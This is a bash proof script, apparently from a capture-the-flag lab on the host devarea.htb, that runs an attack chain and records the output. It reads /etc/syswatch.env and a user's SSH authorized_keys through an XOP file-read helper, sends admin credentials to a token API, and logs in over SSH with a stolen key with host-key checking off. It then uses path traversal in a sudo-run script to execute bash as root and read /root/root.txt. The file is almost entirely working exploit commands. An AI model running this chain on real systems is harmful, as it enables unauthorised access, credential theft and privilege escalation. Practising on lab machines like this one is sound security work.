#!/usr/bin/env bash
set -u

OUT="/home/ctf/ctf/proof_output.txt"
: > "$OUT"

run_cmd() {
  local cmd="$1"
  {
    echo "============================================================"
    echo "$ $cmd"
    echo "------------------------------------------------------------"
  } >> "$OUT"

  timeout 30 bash -lc "$cmd" >> "$OUT" 2>&1
  local ec=$?
  echo "[exit_code]=$ec" >> "$OUT"
  echo >> "$OUT"
}

run_cmd "date -u"
run_cmd "echo HEALTH && curl -sS -i --max-time 8 http://devarea.htb:8080/employeeservice | sed -n '1,20p'"
run_cmd "python3 /home/ctf/ctf/xop_read.py file:///etc/syswatch.env --timeout 20 | sed -n '1,120p'"
run_cmd "python3 /home/ctf/ctf/xop_read.py file:///home/dev_ryan/.ssh/authorized_keys --timeout 20 | sed -n '1,120p'"
run_cmd "curl -sS -i -X POST http://devarea.htb:8888/api/token-auth -H 'Content-Type: application/json' -d '{\"username\":\"admin\",\"password\":\"<HOVERFLY_ADMIN_PASSWORD_REDACTED>\"}' | sed -n '1,80p'"
run_cmd "ssh -i /home/ctf/ctf/devarea_id_ed25519 -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 dev_ryan@<TARGET_IP_REDACTED> 'id; whoami; hostname'"
run_cmd "ssh -i /home/ctf/ctf/devarea_id_ed25519 -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 dev_ryan@<TARGET_IP_REDACTED> 'sudo -l'"
run_cmd "ssh -i /home/ctf/ctf/devarea_id_ed25519 -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 dev_ryan@<TARGET_IP_REDACTED> 'sudo /opt/syswatch/syswatch.sh plugins'"
run_cmd "ssh -i /home/ctf/ctf/devarea_id_ed25519 -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 dev_ryan@<TARGET_IP_REDACTED> 'sudo /opt/syswatch/syswatch.sh logs --list'"
run_cmd "ssh -i /home/ctf/ctf/devarea_id_ed25519 -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 dev_ryan@<TARGET_IP_REDACTED> 'sudo /opt/syswatch/syswatch.sh plugin ../../../../bin/bash -c \"id\"'"
run_cmd "ssh -i /home/ctf/ctf/devarea_id_ed25519 -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 dev_ryan@<TARGET_IP_REDACTED> 'sudo /opt/syswatch/syswatch.sh logs ../../root/root.txt'"

echo "Proof run complete. Output saved to $OUT"
